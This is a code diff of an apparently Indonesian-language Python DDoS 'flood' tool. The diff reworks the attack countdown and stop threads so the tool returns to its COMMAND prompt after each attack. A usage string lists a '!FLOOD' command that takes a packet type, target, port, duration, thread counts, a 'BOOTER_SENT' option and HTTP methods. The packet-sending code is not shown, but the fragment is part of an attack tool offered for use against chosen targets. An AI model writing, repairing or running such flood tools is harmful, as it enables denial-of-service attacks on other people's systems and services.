@@ -109,13 +109,11 @@ def countdown_timer(time_loader):
         remaining = int(time_loader - time.time())
     if not stop_attack.is_set():
         print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
-    command()  # Return to command prompt after attack completes
 
 def stop_attack_thread():
     input()
     stop_attack.set()  # Stop attack on Enter
     print(f"\n{Fore.YELLOW}Serangan Dihentikan{Fore.RESET}")
-    command()  # Return to command prompt
 
 def confirm_exit():
     while True:
@@ -129,6 +127,7 @@ def confirm_exit():
             print(f"{Fore.RED}Input tidak valid. Masukkan 'y' atau 'n'.{Fore.RESET}")
 
 def command():
+    global stop_attack
     while True:
         try:
             data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
@@ -175,7 +174,11 @@ def command():
                         threading.Thread(target=countdown_timer, args=(time_loader,)).start()
                         # Start stop attack thread
                         threading.Thread(target=stop_attack_thread).start()
-                        return  # Return to allow stop_attack_thread to handle input
+                        # Wait for attack to finish or be stopped
+                        while not stop_attack.is_set() and time.time() < time_loader:
+                            time.sleep(0.1)
+                        stop_attack.set()  # Ensure attack stops
+                        continue  # Return to COMMAND prompt
                 else:
                     print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
                     print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| TEST TEST2 TEST3 TEST4 TEST5 {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15){Fore.RESET}")
